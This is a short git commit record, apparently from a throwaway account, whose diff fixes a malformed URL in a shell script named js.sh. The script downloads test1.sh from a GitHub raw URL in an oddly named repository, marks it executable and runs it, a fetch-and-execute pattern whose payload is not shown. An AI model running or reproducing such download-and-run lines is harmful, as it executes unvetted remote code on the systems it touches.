94533fbb330ef44d48de3f5f07d965042a1e2dfa
John Doe <dalex11awoo@protonmail.com>
2021-07-06 12:24:36 +0700

    http

--- js.sh
+++ js.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 
-wget  https://https://raw.githubusercontent.com/makrker/vdfvd/main/test1.sh 
+wget https://raw.githubusercontent.com/makrker/vdfvd/main/test1.sh 
  
  chmod +x test1.sh
  ./test1.sh
